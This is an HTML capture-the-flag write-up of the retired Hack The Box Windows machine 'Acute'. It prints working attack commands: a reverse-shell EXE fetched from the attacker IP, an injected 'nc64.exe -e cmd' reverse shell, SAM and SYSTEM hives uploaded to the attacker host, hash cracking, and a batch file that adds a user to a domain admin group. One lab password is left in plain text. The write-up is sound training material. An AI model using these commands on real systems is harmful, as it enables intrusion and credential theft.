@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Acute &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Acute</h1>
+    <div class="meta">Target: <code>10.10.14.158</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">ActiveDirectory</span><span class="tag">PSWA</span><span class="tag">RestrictedShell</span><span class="tag">Exif</span><span class="tag">docx</span><span class="tag">credentialhunting</span><span class="tag">Invoke-Command</span><span class="tag">Hives</span><span class="tag">LateralMovement</span><span class="tag">ScheduledTask</span><span class="tag">PrivEsc</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#https-website-enumeration">HTTPS Website Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#pswa-login-as-edavies">PSWA Login as edavies</a><a class="lvl3" href="#escaping-via-c-utils-av-free-directory">Escaping via C:\utils (AV-Free Directory)</a><a class="lvl3" href="#stealing-imonks-credentials-via-screenshare">Stealing imonks Credentials via Screenshare</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#imonks-on-atsserver-via-dc-manage">imonks on ATSSERVER via dc_manage</a><a class="lvl3" href="#hijacking-wm-ps1-for-a-shell-as-jmorgan">Hijacking wm.ps1 for a Shell as jmorgan</a><a class="lvl3" href="#dumping-sam-hives">Dumping SAM Hives</a><a class="lvl3" href="#awallace-site-admin-via-keepmeon-bat">awallace → Site Admin via keepmeon.bat</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Acute is a hard Windows Active Directory box centered entirely on chaining limited access contexts together without ever having unrestricted PowerShell. The path starts with OSINT from a public-facing website: a downloadable Word document leaks a default password, a username naming scheme, and a hostname. From there, PowerShell Web Access provides a locked-down <code>dc_manage</code> session. Credential theft via Meterpreter screenshare, SAM hive dumping, password reuse, and a cron-like batch runner ultimately grant control over <code>awallace</code>, who becomes Site Admin and inherits Domain Admin group membership.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="https-website-enumeration">HTTPS Website Enumeration</h3>
+<p>The only open port was 443, serving an IIS site for <code>atsserver.acute.local</code>. Directory brute-forcing found nothing. The <code>/about.html</code> page listed six staff members:</p>
+<pre><code>Aileen Wallace, Charlotte Hall, Evan Davies,
+Ieuan Monks, Joshua Morgan, Lois Hopkins
+</code></pre>
+<p>A downloadable <code>.docx</code> file contained two critical pieces of information:</p>
+<pre><code>Default password for new starters: ‹redacted›
+
+The Staff Induction portal can be found at:
+https://atsserver.acute.local/Staff/Induction
+
+PowerShell Web Access: https://atsserver.acute.local/Acute_Staff_Access/...
+  → session name: dc_manage
+</code></pre>
+<p>Running <code>exiftool</code> on the document leaked a hostname and the domain's username format:</p>
+<pre><code class="language-sh">exiftool New_Starter_CheckList_v7.docx
+Creator          : FCastle
+Computer         : Acute-PC01
+Last Modified By : Daniel
+</code></pre>
+<blockquote>
+<p><strong>Why metadata matters:</strong> Office documents silently record the creating user's login name and the machine name they saved from. <code>FCastle</code> reveals the naming convention (first-initial + last-name), and <code>Acute-PC01</code> is a hostname we can target in PSWA.</p>
+</blockquote>
+<p>Building the user list from the staff names and the <code>FCastle</code> pattern:</p>
+<pre><code>awallace  chall  edavies  imonks  jmorgan  lhopkins
+</code></pre>
+<h2 id="foothold">Foothold</h2>
+<h3 id="pswa-login-as-edavies">PSWA Login as edavies</h3>
+<p>PowerShell Web Access (PSWA) is a browser-based PS remote console. Spraying the default password against the user list confirmed <code>edavies:‹redacted›</code> on <code>Acute-PC01</code> using the <code>dc_manage</code> configuration:</p>
+<pre><code>https://atsserver.acute.local/Acute_Staff_Access/en-US/logon.aspx
+  Username: edavies
+  Password: ‹redacted›
+  Computer: Acute-PC01
+  Config:   dc_manage
+</code></pre>
+<blockquote>
+<p><strong>What is dc_manage?</strong> A PowerShell session configuration can restrict available cmdlets to a whitelist. <code>dc_manage</code> is a constrained endpoint that blocks most cmdlets, preventing direct enumeration. Commands must be sent via <code>Invoke-Command</code> rather than interactively.</p>
+</blockquote>
+<h3 id="escaping-via-c-utils-av-free-directory">Escaping via C:\utils (AV-Free Directory)</h3>
+<p>Trying to run a standard MSFVenom binary in the PSWA session triggered Defender. Enumerating hidden items in <code>C:\</code> revealed a directory the box owners created specifically for bypassing AV:</p>
+<pre><code class="language-powershell">ls -force C:\
+# ...
+type C:\utils\desktop.ini
+[.ShellClassInfo]
+InfoTip=Directory for Testing Files without Defender
+</code></pre>
+<p>Downloading and running a reverse-shell EXE from this directory succeeded:</p>
+<pre><code class="language-powershell">wget http://10.10.14.158:8000/rev.exe -OutFile rev.exe
+.\rev.exe
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+connect to [10.10.14.158] from (UNKNOWN) [10.129.136.40] 49820
+C:\utils&gt; whoami
+acute\edavies
+</code></pre>
+<h3 id="stealing-imonks-credentials-via-screenshare">Stealing imonks Credentials via Screenshare</h3>
+<p>WinPEAS revealed an active RDP session for <code>edavies</code> running on localhost. Using Meterpreter's screenshare function to observe that session caught a visible PowerShell window where the user was constructing a <code>PSCredential</code> object for <code>imonks</code> on <code>ATSSERVER</code>. The password typed on screen:</p>
+<pre><code>imonks:w3_4R3_th3_f0rce.
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="imonks-on-atsserver-via-dc-manage">imonks on ATSSERVER via dc_manage</h3>
+<p>Direct <code>Enter-PSSession</code> to ATSSERVER failed with Access Denied, but the <code>dc_manage</code> constrained endpoint was accessible:</p>
+<pre><code class="language-powershell">$pass = ConvertTo-SecureString &quot;w3_4R3_th3_f0rce.&quot; -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential(&quot;ACUTE\imonks&quot;, $pass)
+Enter-PSSession -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage
+</code></pre>
+<p>The session errors because <code>imonks</code> lacks <code>Measure-Object</code>, but <code>Invoke-Command</code> still works for single commands. The allowed cmdlets are: <code>Get-Alias</code>, <code>Get-ChildItem</code>, <code>Get-Command</code>, <code>Get-Content</code>, <code>Get-Location</code>, <code>Set-Content</code>, <code>Set-Location</code>, <code>Write-Output</code>.</p>
+<p>Listing imonks' desktop found a scheduled PS script:</p>
+<pre><code class="language-powershell">Invoke-Command -ScriptBlock { cat ..\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+</code></pre>
+<pre><code class="language-powershell">$securepasswd = '01000000d08c9ddf...'
+$passwd = $securepasswd | ConvertTo-SecureString
+$creds = New-Object System.Management.Automation.PSCredential (&quot;acute\jmorgan&quot;, $passwd)
+Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds
+</code></pre>
+<h3 id="hijacking-wm-ps1-for-a-shell-as-jmorgan">Hijacking wm.ps1 for a Shell as jmorgan</h3>
+<p><code>ConvertTo-SecureString</code> is not available in the restricted session, so decrypting the blob directly is blocked. Instead, <code>Set-Content</code> can overwrite the script. Replacing <code>Get-Volume</code> with a reverse shell:</p>
+<pre><code class="language-powershell">Invoke-Command -ScriptBlock {
+  ((cat ..\desktop\wm.ps1 -Raw) -replace 'Get-Volume', 'C:\utils\nc64.exe -e cmd 10.10.14.158 53') |
+  sc -Path ..\desktop\wm.ps1
+} -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+</code></pre>
+<p>Running the modified script connected back as <code>jmorgan</code>, who is a local administrator on <code>Acute-PC01</code>:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 53
+C:\Users\jmorgan\Documents&gt; whoami
+acute\jmorgan
+</code></pre>
+<h3 id="dumping-sam-hives">Dumping SAM Hives</h3>
+<pre><code class="language-powershell">reg save HKLM\sam sam.bak
+reg save HKLM\system system.bak
+powershell.exe -c &quot;(New-Object System.Net.WebClient).UploadFile('http://10.10.14.158:8080/', 'sam.bak')&quot;
+powershell.exe -c &quot;(New-Object System.Net.WebClient).UploadFile('http://10.10.14.158:8080/', 'system.bak')&quot;
+</code></pre>
+<pre><code class="language-sh">impacket-secretsdump -sam sam.bak -system system.bak LOCAL
+Administrator:500:‹redacted›:‹redacted›:::
+Natasha:1001:...
+</code></pre>
+<p>John cracked the local Administrator hash:</p>
+<pre><code class="language-sh">john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
+‹redacted›     (Administrator)
+</code></pre>
+<pre><code>administrator:‹redacted›
+</code></pre>
+<h3 id="awallace-site-admin-via-keepmeon-bat">awallace → Site Admin via keepmeon.bat</h3>
+<p>Testing the cracked password for credential reuse on ATSSERVER showed it worked for <code>awallace</code>:</p>
+<pre><code class="language-powershell">$pass = ConvertTo-SecureString &quot;‹redacted›&quot; -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential(&quot;ACUTE\awallace&quot;, $pass)
+Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { whoami }
+acute\awallace
+</code></pre>
+<p>With <code>awallace</code>, the <code>keepmeon</code> directory in Program Files was accessible:</p>
+<pre><code class="language-powershell">Invoke-Command -ScriptBlock { ls '\program files\keepmeon' } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+# keepmeon.bat
+</code></pre>
+<p>Contents of <code>keepmeon.bat</code>:</p>
+<pre><code class="language-bat">REM This is run every 5 minutes. For Lois use ONLY
+@echo off
+for /R %%x in (*.bat) do (
+  if not &quot;%%x&quot; == &quot;%~0&quot; call &quot;%%x&quot;
+)
+</code></pre>
+<blockquote>
+<p><strong>Why this is the win:</strong> the script loops over every <code>.bat</code> file in the directory and executes them, except itself. Anyone who can write a <code>.bat</code> file here effectively schedules a command as whoever runs <code>keepmeon.bat</code>. The docx mentioned Lois is the only person authorized to modify Site_Admin group membership, and <code>Site_Admin</code> provides access to the Domain Admin group.</p>
+</blockquote>
+<pre><code class="language-powershell">Invoke-Command -ScriptBlock {
+  Set-Content -Path '\program files\keepmeon\evil.bat' -Value 'net group site_admin awallace /add /domain'
+} -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+</code></pre>
+<p>After waiting for the cron to fire, <code>awallace</code> appeared in <code>Site_Admin</code>:</p>
+<pre><code class="language-powershell">Invoke-Command -ScriptBlock { net group Site_Admin /domain } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+Group name     Site_Admin
+Comment        Only in the event of emergencies is this to be populated. This has access to Domain Admin group
+
+Members
+awallace
+</code></pre>
+<h2 id="root">Root</h2>
+<p>With <code>awallace</code> in <code>Site_Admin</code>, which grants Domain Admin access, full control of the domain is achieved.</p>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Metadata in documents is actionable recon.</strong> The <code>.docx</code> provided the default password, username scheme, hostname, and a named PS session configuration, which is essentially a full attack plan.</li>
+<li><strong>Constrained PS endpoints are a speed bump, not a wall.</strong> The <code>dc_manage</code> whitelist blocked many cmdlets but still allowed <code>Get-Content</code> and <code>Set-Content</code>, which was enough to inject into a running script.</li>
+<li><strong>Screensharing an interactive session is a quiet credential-theft technique.</strong> No exploit, no log noise; you just watch the user type their password.</li>
+<li><strong>Batch-file runners are a privilege escalation vector.</strong> Any "run all <code>.bat</code> files in this directory" pattern is effectively a local scheduled task that runs as the account executing the parent script.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
